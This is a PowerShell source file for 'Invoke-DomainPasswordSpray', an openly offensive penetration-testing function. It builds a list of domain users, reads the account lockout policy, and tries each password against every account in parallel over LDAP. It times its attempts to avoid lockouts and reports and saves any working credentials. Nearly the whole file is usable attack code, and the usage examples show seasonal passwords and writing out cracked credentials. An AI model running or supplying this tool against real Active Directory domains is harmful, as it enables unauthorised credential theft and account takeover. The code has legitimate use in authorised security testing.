function Invoke-DomainPasswordSpray {

    <#
    .SYNOPSIS
    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack),  Brian Fehrman (@fullmetalcache), and Michael Davis (@mdavis332)
    License: MIT
    Required Dependencies: Get-DomainUserList, Get-DomainPasswordPolicy, Invoke-Countdown, Invoke-Parallel
    Optional Dependencies: None
    .DESCRIPTION
    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
    .PARAMETER UserList
    Optional UserList parameter. This will be generated automatically if not specified.
    .PARAMETER PasswordList
    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
    .PARAMETER DomainName
    The domain to spray against.
    
    .EXAMPLE
    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
    
	.EXAMPLE
    C:\PS> Invoke-DomainPasswordSpray -UserList (Get-Content 'c:\users.txt') -DomainName domain.local -PasswordList (Get-Content 'c:\passlist.txt') | Out-File 'sprayed-creds.txt'
    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain.local" using each password in the passlist.txt file one at a time. 
	It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
    #>
	
	[CmdletBinding()]
	param (
		[Parameter(	Position = 0, 
					Mandatory = $true,
					HelpMessage = "Password to use. This can be a single string or an array of strings."
		)]
		[string[]]$PasswordList,
		
		[Parameter(	Position = 1, 
					Mandatory = $false, 
					ValueFromPipeline = $true, 
					ParameterSetName = 'String',
					HelpMessage = "User list against which to spray passwords. Can be a single string or array of strings."
		)]
		[string[]]$UserList,
		
		# future expansion to include ADUser objects as a parameter
		# [Parameter(Position = 1, Mandatory = $false, ValueFromPipeline = $true, ParameterSetName = 'Pipeline')]
		# [Microsoft.ActiveDirectory.Management.ADAccount[]]$InputObject,
		
		[Parameter(	Position = 2, 
					Mandatory = $false,
					HelpMessage = "Fuly qualified domain name,e.g.: testlab.local. If nothing specified, script automatically attempts to pull FQDN from environment."
		)]
		[Alias('Domain')]
		[string]$DomainName
	)

	$DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	if ($DomainName -eq $null -or $DomainName -eq '') {
		$DomainName = $DomainObject.Name
	}
	
	try {
		# Using domain specified with -DomainName option
		$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$DomainName").distinguishedName
		
	} catch {
		Write-Error '[*] Could not connect to the domain. Try again specifying the domain name with the -DomainName option'
		break
	}
	
	# Just output a bunch of empty lines so Write-Progress doesn't cover up useful info
	1..11 | ForEach-Object { Write-Host '[*] ...' }
	
	$DomainPasswordPolicy = Get-DomainPasswordPolicy -DomainName $DomainName -CheckPso

	$ObservationWindow = $DomainPasswordPolicy.'Lockout Observation Interval (Minutes)'
	$LockoutThreshold = $DomainPasswordPolicy.'Account Lockout Threshold (Invalid logon attempts)' # don't scan more than this many times within the LockoutObservationWindow.Minutes

	
	<# expansion if ever include ADAccounts as input objects for parameter
	# Pipeline input detector
	if ($PSCmdlet.ParameterSetName -ne 'String') {
		$UserList = $input | Select-Object -ExpandProperty Name
	}
	#>
	# No pipeline and no parameter specified
	if ($UserList -eq $null) {
		Write-Host '[*] Now creating a list of users to spray...'
		# if there's no lockout threshold (ie, lockoutThreshold = 0, don't bother removing potential lockouts)
		if ($LockoutThreshold -eq 0) {
			$UserList = Get-DomainUserList -RemoveDisabled -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
		} else {
			$UserList = Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts -SmallestLockoutThreshold $LockoutThreshold -DomainName $DomainName
			Write-Host "[*] The smallest lockout threshold discovered in the domain is $LockoutThreshold login attempts."
		}
	}
	
	if ($UserList -eq $null -or $UserList.count -lt 1) {
		Write-Error '[*] No users available to spray. Exiting'
		break
	}
	if ($LockoutThreshold -eq 0) {
		Write-Host -ForegroundColor Yellow '[*] There appears to be no lockout policy. Go nuts'
	}

	Write-Host "[*] The domain password policy observation window is set to $ObservationWindow minutes."
	$StartTime = Get-Date

	Write-Host -ForegroundColor Yellow "[*] Password spraying has begun against $($UserList.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
	
	$CurrentPasswordIndex = 0
	
	foreach ($Password in $PasswordList) {
		
		$PasswordStartTime = Get-Date
		
		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"	
		
		$UserList | Invoke-Parallel -ImportVariables -Throttle 50 -Quiet -ScriptBlock {
			
			
			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:Password)
			
			if ($TestDomain.Name -ne $null) {
				
				
				Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $Password"
				
				$CredDetails = New-Object PSObject
				$CredDetails | Add-Member -MemberType NoteProperty -Name "UserName" -Value $_
				$CredDetails | Add-Member -MemberType NoteProperty -Name "Password" -Value $Using:Password
				$CredDetails | Add-Member -MemberType NoteProperty -Name "DomainName" -Value $Using:DomainName
				
				$CredDetails
				
			}

		}
		
		$PasswordEndTime = Get-Date
		$PasswordElapsedTime = New-Timespan –Start $PasswordStartTime –End $PasswordEndTime
		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString())"
		Write-Host $("[*] Total time elapsed trying $Password was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)

		$CurrentPasswordIndex++
		if ($LockoutThreshold -gt 0 -and ( $($PasswordList.count) - $CurrentPasswordIndex ) -gt 0) {
			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "Spraying users on domain $DomainName" -Subtext "[*] $CurrentPasswordIndex of $($PasswordList.count) passwords complete. Pausing to avoid account lockout"
		}
		
	}
	
	
	$EndTime = Get-Date
	$ElapsedTime = New-Timespan –Start $StartTime –End $EndTime
	Write-Host -ForegroundColor Yellow "[*] Password spraying is complete at $($EndTime.ToShortTimeString())"
	Write-Host $("[*] Overall runtime was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $ElapsedTime)
	
}
